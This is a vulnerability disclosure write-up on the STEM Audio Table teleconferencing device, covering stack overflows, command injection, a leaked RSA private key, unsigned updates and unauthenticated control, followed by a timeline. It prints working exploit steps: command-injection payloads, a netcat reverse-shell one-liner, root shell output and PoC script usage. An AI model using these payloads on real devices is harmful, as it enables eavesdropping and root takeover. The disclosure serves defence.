# Overview

The STEM Audio Table contains a number of vulnerabilities which allow a
network attacker to take complete control over the device, enabling them
to eavesdrop on offices and gain persistence on the network. This is a
case study showing the inherent risk of modern Video Teleconferencing
(VTC) devices and why these types of products should have some level of
security review before procurement.

These vulnerabilities include:

-   two exploitable stack overflows

-   a command injection flaw

-   leaking private encryption keys

-   update process can be hijacked

-   unauthenticated interface to control the device

GRIMM researchers wrote an exploit for one of the stack overflows and
the command injection vulnerability, resulting in multiple avenues for
achieving Remote Code Execution (RCE) with root privileges.
Additionally, best practices such as using the principle of least
privilege and enabling exploit mitigations, such as Position-Independent
Executable (PIE), were not in use.

While GRIMM focused its research efforts on the STEM Audio Table device,
these vulnerabilities are expected to be shared across the entire Stem
Audio product line. More importantly, these kinds of vulnerabilities are
not unique to this particular make of VTC hardware. To that end, the
mitigations needed for the STEM Audio Table are also applicable to the
entire class of networked communication devices.

# Bug identification

## Stack Buffer Overflow

-   Location: local_server_get() and sip_config_get() in
    stem_firmware_linux_2.0.0.out

-   Affected Versions: 2.0.0 - 2.0.1 (latest)

-   Impact: Arbitrary RCE as root

-   CVE Numbers: TBD,TBD

A stack-based buffer can be overrun with user-controlled data in the
`local_server_get` function. This function is responsible for handling
user requests to retrieve the “local server" device configuration
option. This is done by first requesting that the device set this option
to a user-controlled value, followed by an inquiry on what that value
is. The storage container for this setting is much larger than the stack
buffer size allotted for it while preparing the response packet that
will be returned to the user. As such, the contents of the retrieved
configuration value will spill onto the surrounding stack due to the use
of `sprintf` to unsafely copy the data contents. Exploitation of this
vulnerability could allow attackers to remotely execute arbitrary code
as root on the device.

The same pattern used to trigger the buffer overflow of the “local
server" setting can similarly be used to exercise a buffer overflow in
the handlers responsible for getting and setting Session Initiation
Protocol (SIP) configuration options. The function execution flow of
`sip_config_get` is identical to `local_server_get`, and so the same
exploitation pattern as described above can be used. The pattern of
using `sprintf` or `strcpy` is used very often in this binary and, as
such, likely provides many more buffer overflow opportunities.

## Command Injection

-   Location: system_update_now() in stem_firmware_linux_2.0.0.out

-   Affected Versions: 2.0.0 - 2.0.1 (latest)

-   Impact: Arbitrary RCE as root

-   CVE Number: TBD

The firmware update mechanism is handled by a Python support script that
runs with user-supplied arguments. The `system_update_now` function
handler is responsible for invoking this script as shown:

      sprintf(&command, "python /home/root/Scripts/stem_check_update.py 
      %s %s %s &", url, user, password);

No sanitization is performed on these arguments (“url", “user", or
“password") before invoking `system` to start the Python interpreter.
The origin of these three parameters is the entirely user-controlled
“local server" device configuration option. Exploitation of this
vulnerability is shown to provide attackers the ability to execute
arbitrary code as root on the device.

## Other Miscellaneous Security Concerns

### Control Interface Authentication

One of the most damaging findings was that the device was externally
controllable with no authentication. The web-based Graphical User
Interface (GUI) appeared to be the only mechanism that employed any form
of credential enforcement. Authentication should never be a client-side
operation, as seemed to be the intent with the STEM Audio Table. After
understanding the command structure (see "Sending Commands to STEM Audio Table")
it was observed that any operation the GUI was capable of, and more,
could be remotely executed without knowing the organization password.
Further, if the current password were desired, one need only ask with a
special use of the `STEM_ORG_LEAVE_REQ` command. Altogether, the device
can be completely controlled through this unauthenticated interface. A
subset of available commands includes:

-   Enable SSH (requires user passwords to login)

-   Factory Reset

-   Get/Set Organization Password

-   Reboot

-   Set Update Server URL

-   Check For Updates

### Breaking Encryption

During testing, it was observed that communication between the STEM
Audio Table device and the web GUI used for configuration was
occasionally encrypted. This encryption appeared to be used during
particularly sensitive operations like setting user passwords or other
types of credentials. However, the device’s employed logic does not
enforce or require such encryption. The same commands can be sent in
plaintext and the device will happily handle the request without
objection.

Additionally, due to an oversight by developers, the private key
associated with the encrypted data is freely available in the firmware
update packages. In fact, it can even be downloaded directly from the
device.

```
$ curl http://192.168.0.205/cgi-bin/privatekey.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAiIWJDejXy6jCM3VFggZYA6XsxZgJ8rwGRRBjc4/nRmD6ZmIn
U+MZICmTfdTAHHW+tYhLKttc+e3hyAjoBk2lXo2hP9b3HbXo3vsIvlVgsp8X6kh3
LZexDUp9dOBxkh8HyC2QQjSut0X31jK6mUmE/hHsx2FJynV2qmiWtW8+HS6Qt1mE
pzlwRWdmw03VR8s7sLB/WbML3gzCthZlZ6l/KpbIkr4akxezFL+6A/8A/iactmgl
...
```

Network traffic is easily decrypted after acquiring this private key.

### Update process

While the update process was not researched in depth, it was clear that
update packages are unsigned tarballs. At boot, the device checks for a
previously downloaded tar file and, if present, extracts it to a fixed
location on the filesystem and runs a hardcoded script from within.

The update process appeared to be authenticated with user-supplied
credentials if configured to use a “local server" as the source of such
updates. This configuration supports installation scenarios where the
device is somehow firewalled, or otherwise isolated from, the Internet
and so is unable to contact Stem Audio directly for update packages.
However, the unauthenticated control interface described in "Sending Commands to STEM Audio Table"
can be used to enable this update configuration and arbitrarily change
the Uniform Resource Locator (URL) , username, and password used by the
device while checking for updates. As such, an attacker might able to
forge a legitimate update by creating a tarball conforming to an
expected naming scheme, hosting it on a fake update server pointed to by
the newly configured local-server URL, and forcing an update check (see "Command Injection").
In this way, the device would, through its ordinary update process,
download an attacker-controlled tarball and execute attacker-controlled
scripts from within, thereby achieving RCE.

### Lack of User Isolation

All services on the STEM Audio Table were observed to be running as
root. This implies that an exploited vulnerability in any component of
the Stem device may ultimately provide execution in the context of the
most privileged user on a Linux machine. A common technique not employed
here is to make use of several non-root user accounts that only have
access to resources strictly required for their operation, known as the
Principle of Least Privilege. In cases where elevated privileges are
needed, Interprocess Communication (IPC) to higher privileged services
or use of Linux groups will often suffice.

# Technical analysis

## Software Architecture

<figure>
<img src="images/software_arch.png" id="arch" style="width:90.0%" alt="Runtime software components of the STEM Audio Table device and their associated ports" /><figcaption aria-hidden="true">Figure 1: Runtime software components of the STEM Audio Table device and their associated ports</figcaption>
</figure>

The runtime software architecture of the STEM Audio Table device
consists of a single userpace binary hosting a device control service
(port 8899) alongside the typical SIP service (port 5060). The control
service is routed through a Python WebSocket server that handles
in-transit decryption and minor processing of select commands. A
majority of commands are forwarded to the backend service provider as
depicted in Figure
<a href="#arch" data-reference-type="ref" data-reference="arch">1</a>.

## Sending Commands to STEM Audio Table

The STEM Audio Table device is controllable from external endpoints
through the control interface. While “control interface” is not an
official term from the vendor, it will be used throughout this analysis
to describe the interface through which the STEM Audio Table device can
be externally controlled. The control interface listens on port 8899 for
commands. The command structure is quite simple, and follows the form:

\$IP@STEM\_\${COMMAND}:\${ARGS}

Where `IP` seems to either be the device IP or broadcast (e.g.
255.255.255.255) address, `COMMAND` is the desired command, and `ARGS`
are arguments to the command. It should be noted that the handlers
generally expect the arguments to be strings, so including NUL-bytes may
prematurely terminate your argument data when being copied around during
processing.

## Stack Buffer Overflows

The vulnerable functions are `sip_config_get` and `local_server_get` and
exploitation could result in arbitrary code execution. Listing
<a href="#stackoverflow" data-reference-type="ref" data-reference="stackoverflow">[stackoverflow]</a>
shows the decompiled logic of the `local_server_get` function.

``` objectivec
int local_server_get(void)
        {
          char buf[104];
          char *value;

          value = settings_get_value(0x14u);
          sprintf(buf, "STEM_LOCAL_SERVER_URL_GET_RSP:%s;", value);
          return udp_send_message(buf, STACK[0x450]);
        }
```

To exercise the stack overflow one must first *set* the local server
configuration setting and then *get* the same setting (see Listing
<a href="#overflowcommands" data-reference-type="ref" data-reference="overflowcommands">[overflowcommands]</a>).
The data will be copied unbounded into the stack buffer variable `buf`.
Because the STEM Audio Table device’s userspace binaries are not
compiled as PIE, exploitation of this overflow can be used to trigger a
Return-Oriented Programming (ROP) execution chain to have some useful
effect, like spawning a reverse shell. Note that even userspace
libraries dynamically loaded into the process have fixed base addresses,
despite being compiled as shared objects that support Address Space
Layout Randomization (ASLR).

```
send, port 8899 -> XXX.XXX.XXX.XXX@STEM_LOCAL_SERVER_URL_SET_REQ:AAAAAA...
send, port 8899 -> XXX.XXX.XXX.XXX@STEM_LOCAL_SERVER_URL_GET_REQ:
```

The ARGS component (See "Sending Commands to STEM Audio Table") 
in the `set` command in the snippet in Listing
<a href="#overflowcommands" data-reference-type="ref" data-reference="overflowcommands">[overflowcommands]</a>
is shown with an ellipsis (“AAAAAA...”). In practice, the length of this
data should be long enough to overflow `buf` and overwrite the return
address stored on the stack. For version 2.0.1, this is greater than or
equal to 78 bytes of data.

Note that when the backend service binary
`stem_firmware_linux_2.0.0.out` exits, the system will trigger a reboot
in approximately 15 seconds. As such, this vulnerability could
additionally be used to crash the backend service process, which would
cause the entire device to reboot. Repeating this process would result
in a Denial of Service (DoS) attack that would render all local STEM
Audio Table devices effectively useless.

The second exploitable stack buffer overflow is located in the
`sip_config_get` function. The vulnerable code follows the same pattern
as above (`sprintf` of user controlled data) and can be exploited in the
same way.

## Command Injection

The STEM Audio Table backend service makes extensive use of the `system`
library call. Finding a command injection technique came down to finding
cross-references to this library function and the STEM Audio Table code
that used it. After a short time, the function `system_update_now` gave
us a lead:

```
int system_update_now()
{
  int offset;
  char *value;
  char url[[];
  char user[];
  char pass[];
  char command[];

  if ( device_normal_op() )
  {
    ...
    offset = 0;
    value = settings_get_value(0x14u);
    parse_until_delimiter(value, url, &offset, ";");
    parse_until_delimiter(value, user, &offset, ";");
    parse_until_delimiter(value, pass, &offset, ";");
    sprintf(&command, "python /home/root/Scripts/stem_check_update.py %s %s %s &",
        url, user, pass);
    if ( system(&command) == -1 )
    {
        handle_error(-250, "system/system.c", 0xEAu);
        ... 
    }
    ...
  }
}
```

This function takes an arbitrary string from the configuration data and
parses out three arguments: url, user, password. It then directly copies
each of these into a composite buffer that is then passed to the
`system` library call. If the contents of the 0x14 setting can be set to
user-controlled data then we can achieve command injection, and
subsequently RCE.

Indeed, arbitrary control of the 0x14 setting is possible. This unnamed
settings was determined to be associated with the ”local server"
configuration and can be set by sending the device the following command
template:

\$IP@STEM_LOCAL_SERVER_URL_SET_REQ:\${URL};\${USER};\${PASSWORD};

The code responsible for handling user input does not implement
sanitization, so user data is passed as-is into the configuration
profile of the device. Later, when this user-supplied value is used in
some way, it remains entirely user-controlled. If this user-controlled
data is passed to a call to `system` directly, as the function
`system_update_now` from Listing
<a href="#sysupdate" data-reference-type="ref" data-reference="sysupdate">[sysupdate]</a>
is shown to do, then back-ticks may be used to spawn sub-shells to run
arbitrary commands in the context of the backend service provider. For
example, to reboot the device the appropriate setup command is:

\$IP@STEM_LOCAL_SERVER_URL_SET_REQ:‘reboot‘;;;

Followed by a triggering command that forces the device down this
vulnerable code path. It was determined that the vulnerable function was
associated with a call tree that starts with the command handler for the
following command:

\$IP@STEM_FW_UPDATE_NOW_REQ:

If we first spawn a local listener (e.g. `nc -lk $IP $PORT`), a reverse
shell is achievable by sending the following command as described above
(followed by the triggering command):

mkfifio /tmp/a && cat /tmp/a $|$ /bin/sh -i 2$>$&1 $|$ nc \$IP \$PORT
$>$/tmp/a

Note the use of && rather than a semi-colon as a shell command
separator. Recall that the vulnerable code uses semi-colons as its own
internal delimiters and, as such, cannot be used within an injected
command. The effect of executing this command after starting the local
listener is shown in the following listing:

```
$ nc -kl 192.168.0.200 5555
sh: cannot set terminal process group (217): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4# id
uid=0(root) gid=0(root)
sh-4.4# cat /proc/cpuinfo
processor       : 0
model name      : ARM926EJ-S rev 5 (v5l)
BogoMIPS        : 220.92
Features        : swp half thumb fastmult edsp java
CPU implementer : 0x41
CPU architecture: 5TEJ
CPU variant     : 0x0
CPU part        : 0x926
CPU revision    : 5

Hardware        : Generic DA850/OMAP-L138/AM18x
Revision        : 0000
Serial          : 0000000000000000
```

## Testing

A Python script, `stem.py`, is provided to interface with the STEM Audio
Table device. This script can be used to validate two of vulnerabilities
outlined above: the `local_server_get` stack overflow and the command
line injection. Additionally, this script provides functions for
interfacing with the device in other ways as an unauthenticated user,
including decrypting encrypted messages with the leaked private key,
turning the device’s display lights on and off, and factory reseting the
device.

To exercise the stack overflow and, as a result, observe a device
reboot, the following command can be used where `$STEM_IP` is the IP
address of the STEM Audio Table device:

python3 stem.py –ip \$STEM_IP –func crash

Once the service crashes a hardcoded fifteen second timer begins, after
which the device will begin to reboot itself. On boot the device will
emit an audible chime. This will be observed roughly two minutes after
the forced crash.

The second provided Proof of Concept (PoC) is for the reverse-shell as
shown in Listing
<a href="#revshell" data-reference-type="ref" data-reference="revshell">[revshell]</a>.
First, spawn a network listener using `nc` as shown in the same listing,
followed by:

python3 stem.py –ip \$STEM_IP –func reverse-shell –args
\$LOCAL_IP:\$LOCAL_PORT

Where `$LOCAL_IP` and `$LOCAL_PORT` are the IP and port as specified in
the local network listener. Additionally, the `–func` argument `list`
can be used to see all supported commands and their descriptions.

# Timeline

-   04/23/2021 - First attempt to Notify vendor (Stem Audio)

-   04/28/2021 - Second attempt to notify vendor (Stem Audio)

-   05/07/2021 - Notified parent company (Shure)

-   06/08/2021 - Final patch released by Stem Audio

-   06/08/2021 - NotQuite0DayFriday release

-   06/08/2021 - Blog post release
